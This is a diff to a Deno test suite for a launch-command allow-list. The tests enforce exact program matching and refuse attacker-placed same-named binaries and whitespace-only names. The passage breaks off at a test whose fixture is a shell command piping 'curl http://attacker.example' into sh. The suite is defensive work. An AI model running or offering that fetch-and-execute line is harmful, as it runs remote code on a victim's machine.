@@ -177,45 +177,104 @@ Deno.test("a command location is refused unless its program is allow-listed", ()
   );
 });
 
-Deno.test("the command allow-list matches the program or its last segment", () => {
-  // A bare entry admits the program wherever it lives, so an operator does not
-  // have to know the descriptor's spelling...
+Deno.test("the command allow-list matches the program exactly", () => {
+  // An entry admits the exact string the descriptor wrote, and nothing else.
   assertEquals(
     launchDenial(
-      commandOf("/usr/bin/make", "release"),
+      commandOf("make", "release"),
       env({ [LAUNCH_COMMANDS_ENV]: "make" }),
     ),
     null,
   );
   assertEquals(
     launchDenial(
-      commandOf("C:\\Program Files\\make.EXE"),
-      env({ [LAUNCH_COMMANDS_ENV]: "MAKE.exe" }),
+      commandOf("/usr/bin/make", "release"),
+      env({ [LAUNCH_COMMANDS_ENV]: "/usr/bin/make" }),
     ),
     null,
   );
-  // ...while an absolute entry admits only itself, which is how an operator
-  // binds the program to one path.
+  // Case folds, because Windows program names do.
   assertEquals(
     launchDenial(
-      commandOf("/tmp/evil/make", "release"),
+      commandOf("MAKE"),
+      env({ [LAUNCH_COMMANDS_ENV]: "make" }),
+    ),
+    null,
+  );
+});
+
+Deno.test("a bare allow-list entry does not admit a same-named file elsewhere", () => {
+  // The descriptor chooses the program string *and* the working directory a
+  // relative one resolves against. Matching by basename would therefore let a
+  // registry writer point the operator's trusted `make` at a file of their own
+  // — so `make` admits the bare name the OS resolves on PATH, and nothing else.
+  const allowed = env({ [LAUNCH_COMMANDS_ENV]: "make" });
+  for (
+    const program of [
+      "/tmp/attacker/make",
+      "./make",
+      "../make",
+      ".//make",
+      "C:\\attacker\\make",
+      "attacker/make",
+    ]
+  ) {
+    assertEquals(
+      launchDenial(commandOf(program, "release"), allowed)?.reason,
+      "launch_command_not_allowed",
+      `${program} must not be admitted by the bare entry "make"`,
+    );
+  }
+  // The converse: an absolute entry does not admit the bare name either.
+  assertEquals(
+    launchDenial(
+      commandOf("make"),
       env({ [LAUNCH_COMMANDS_ENV]: "/usr/bin/make" }),
-    )?.reason,
+    )
+      ?.reason,
     "launch_command_not_allowed",
   );
 });
 
-Deno.test("the command allow-list shares its spelling with the host list", () => {
-  // Comma- or space-separated, trimmed, and `*` for an operator who has decided
-  // the registry itself is trusted.
+Deno.test("a program that trims to nothing is never admitted", () => {
+  // `allowList` drops empty entries, so no list can hold "" — but a program of
+  // whitespace must be refused on its own account, not by that coincidence.
+  for (const program of [" ", "\t", "\u00a0", "\u200b"]) {
+    assertEquals(
+      launchDenial(commandOf(program), env({ [LAUNCH_COMMANDS_ENV]: "make" }))
+        ?.reason,
+      "launch_command_not_allowed",
+    );
+    assertEquals(
+      launchDenial(commandOf(program), env({ [LAUNCH_COMMANDS_ENV]: "" }))
+        ?.reason,
+      "launch_command_not_allowed",
+    );
+  }
+});
+
+Deno.test("the command allow-list is comma-separated, so a path may contain spaces", () => {
+  // Trimmed, newline-tolerant, and separated on commas rather than whitespace —
+  // a hostname never contains a space but a program path routinely does.
   for (
-    const raw of ["make, deploy.sh", "make deploy.sh", " make ,,deploy.sh "]
+    const raw of [
+      "make, deploy.sh",
+      "make\ndeploy.sh",
+      " make ,,deploy.sh ",
+    ]
   ) {
     assertEquals(
       launchDenial(commandOf("deploy.sh"), env({ [LAUNCH_COMMANDS_ENV]: raw })),
       null,
     );
   }
+  assertEquals(
+    launchDenial(
+      commandOf("C:\\Program Files\\make.EXE"),
+      env({ [LAUNCH_COMMANDS_ENV]: "make, c:\\program files\\make.exe" }),
+    ),
+    null,
+  );
   assertEquals(
     launchDenial(
       commandOf("/bin/sh", "-c", "curl http://attacker.example | sh"),
